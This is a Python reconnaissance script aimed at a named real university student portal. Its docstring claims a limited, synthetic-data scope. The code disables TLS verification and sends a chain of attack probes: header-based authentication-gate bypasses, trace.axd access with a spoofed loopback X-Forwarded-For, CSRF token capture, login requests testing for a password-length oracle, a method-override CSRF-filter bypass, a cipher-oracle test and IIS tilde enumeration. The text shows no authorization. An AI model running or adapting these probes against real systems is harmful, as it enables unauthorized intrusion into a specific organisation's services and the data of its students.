#!/usr/bin/env python3
"""Deep probe round (scope: single low-rate requests, no scanners, no auth
attempts, synthetic data only). Outputs compact table + saves interesting
bodies to recon/probes/."""
import base64, hashlib, json, os, re, socket, ssl, time, http.client
import urllib.request, urllib.error

# Pin the resolved IP (DNS burst flakiness on this box); SNI keeps the hostname.
RESOLVED_IP = "98.70.14.50"

class PinnedHTTPSConnection(http.client.HTTPSConnection):
    _dumps = 0
    def connect(self):
        import hashlib, ssl as _ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        self.sock = socket.create_connection((RESOLVED_IP, self.port),
                                             self.timeout, self.source_address)
        if self._tunnel_host:
            self._tunnel()
        self.sock = ctx.wrap_socket(self.sock, server_hostname=self.host)
        der = self.sock.getpeercert(binary_form=True)
        h = hashlib.sha256(der).hexdigest()[:12] if der else None
        print(f"DBG der={h}", flush=True)
        if h != "ac5809c88035":  # known-good cert pinned
            if PinnedHTTPSConnection._dumps < 3 and der:
                PinnedHTTPSConnection._dumps += 1
                open(f"/tmp/badcert-{PinnedHTTPSConnection._dumps}.der", "wb").write(der)
            raise urllib.error.URLError(f"unexpected cert {h}")

class PinnedHTTPSHandler(urllib.request.HTTPSHandler):
    def https_open(self, req):
        return self.do_open(PinnedHTTPSConnection, req)

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

urllib.request.install_opener(urllib.request.build_opener(PinnedHTTPSHandler, NoRedirect))

T = "https://mujslcm.jaipur.manipal.edu"
OUT = os.path.expanduser("~/mujslcm-recon/recon/probes")
os.makedirs(OUT, exist_ok=True)
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 recon"

def get(path, extra_headers=None):
    req = urllib.request.Request(T + path, headers={"User-Agent": UA, **(extra_headers or {})})
    for attempt in range(3):
        try:
            with urllib.request.urlopen(req, timeout=25) as r:
                body = r.read()
                return r.status, dict(r.headers), body
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), (e.read() if e.fp else b"")
        except (urllib.error.URLError, OSError) as e:
            if attempt == 2:
                raise
            time.sleep(2.5)

def post(path, data, extra_headers=None):
    req = urllib.request.Request(T + path, data=data.encode(),
                                 headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
                                          **(extra_headers or {})})
    for attempt in range(3):
        try:
            with urllib.request.urlopen(req, timeout=25) as r:
                return r.status, dict(r.headers), r.read()
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), (e.read() if e.fp else b"")
        except (urllib.error.URLError, OSError) as e:
            if attempt == 2:
                raise
            time.sleep(2.5)

rows = []

# A1: robots/sitemap/security.txt/favicon
for p in ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt", "/security.txt", "/favicon.ico"]:
    st, h, b = get(p)
    rows.append((p, st, len(b), b[:60].decode(errors="replace").strip().replace("\n", " ")[:50]))
    if p == "/favicon.ico" and st == 200:
        rows.append(("favicon sha256", "", 32, hashlib.sha256(b).hexdigest()[:16]))
        open(os.path.join(OUT, "favicon.ico"), "wb").write(b)
    time.sleep(1.2)

# B: fresh cookie dump on /
st, h, b = get("/")
sc = h.get("Set-Cookie", "")
rows.append(("Set-Cookie audit", st, len(b), sc.replace(",", " , ")[:180]))
open(os.path.join(OUT, "home-headers.txt"), "w").write(str(h))
time.sleep(1.2)

# C: PROPFIND + OPTIONS *
for m, p, hd in [("PROPFIND", "/", {}), ("OPTIONS", "*", {})]:
    req = urllib.request.Request(T + p, method=m, headers={"User-Agent": UA, **hd})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            rows.append((f"{m} {p}", r.status, len(r.read()), r.headers.get("Allow", "")[:80]))
    except urllib.error.HTTPError as e:
        rows.append((f"{m} {p}", e.code, 0, e.headers.get("Allow", "")[:80]))
    time.sleep(1.2)

# D: X-Original-URL auth-gate bypass probe
st, h, b = get("/Home/Index", {"X-Original-URL": "/Student/Academic/AttendanceSummaryForStudent",
                               "X-Rewrite-URL": "/Student/Academic/AttendanceSummaryForStudent"})
rows.append(("X-Original-URL gate", st, len(b), ("REDIRECT?" if st == 302 else "CHECK BODY")))
open(os.path.join(OUT, "xoriginal.html"), "w").write(b.decode(errors="replace"))
time.sleep(1.2)

# E: trace.axd with XFF loopback
st, h, b = get("/trace.axd", {"X-Forwarded-For": "127.0.0.1"})
rows.append(("trace.axd XFF", st, len(b), b[:60].decode(errors="replace").strip()[:50]))
time.sleep(1.2)

# F: anti-CSRF token capture
m = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', b.decode(errors="replace"))
# b is from trace probe; refetch /
st, h, b = get("/")
m = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', b.decode(errors="replace"))
tok = m.group(1) if m else ""
ck = re.search(r"__RequestVerificationToken=([^;]+)", h.get("Set-Cookie", ""))
cook = f"__RequestVerificationToken={ck.group(1)}" if ck else ""
rows.append(("CSRF token", "", len(tok), ("captured" if tok else "MISSING")))
time.sleep(1.2)

def login_probe(label, pw):
    body = f"UserName=deep-probe-synthetic&Password={pw}&EmailFor=student&LoginFor=Student&__RequestVerificationToken={tok}"
    st, h, b = post("/", body, {"Cookie": cook})
    t = b.decode(errors="replace")
    msg = re.search(r'<span[^>]*>([^<]{5,80})</span>', t)
    rows.append((label, st, len(b), (msg.group(1) if msg else t[:50].replace("\n", " ")[:50]).strip()[:70]))
    return st, len(b), t

# F: password-length oracle (same synthetic user, two lengths)
st8, l8, t8 = login_probe("pw len 8", "A" * 8)
time.sleep(1.5)
st300, l300, t300 = login_probe("pw len 300", "A" * 300)
rows.append(("pw-oracle verdict", "", 0, f"8:{st8}/{l8} vs 300:{st300}/{l300} => {'DIFFERS (local hash?)' if (st8 != st300 or l8 != l300) else 'SAME (federated or generic)'}"))
time.sleep(1.5)

# G: X-HTTP-Method-Override on the login POST (CSRF filter bypass probe)
st, h, b = post("/", f"UserName=x&Password=y&__RequestVerificationToken={tok}",
                {"Cookie": cook, "X-HTTP-Method-Override": "GET"})
rows.append(("method-override POST", st, len(b), b[:60].decode(errors="replace")[:50]))
time.sleep(1.2)

# H: enc cipher oracle (valid base64 garbage of two sizes)
for label, payload in [("enc 64B", base64.urlsafe_b64encode(b"\x01" * 48).rstrip(b"=").decode()),
                       ("enc 16B", base64.urlsafe_b64encode(b"\x02" * 12).rstrip(b"=").decode())]:
    st, h, b = get(f"/Home/Index?enc={payload}")
    e = re.search(r"([A-Za-z]+Exception)", b.decode(errors="replace"))
    rows.append((f"{label} oracle", st, len(b), (e.group(1) if e else b[:40].decode(errors="replace")[:40])))
    time.sleep(1.2)

# I: IIS 8.3 tilde probes
for p in ["/~1*/.aspx", "/C*~1*/.aspx", "/Content/*~1*/.css"]:
    st, h, b = get(p)
    rows.append((f"tilde {p}", st, len(b), ""))
    time.sleep(1.2)

# J: aspxerrorpath hint
st, h, b = get("/Home/Error?aspxerrorpath=/nonexistent")
rows.append(("aspxerrorpath", st, len(b), b[:50].decode(errors="replace")[:48]))
time.sleep(1.2)

print(f"{'probe':38} {'st':>4} {'len':>7}  note")
print("-" * 100)
for r in rows:
    print(f"{r[0]:38} {str(r[1]):>4} {str(r[2]):>7}  {r[3][:80]}")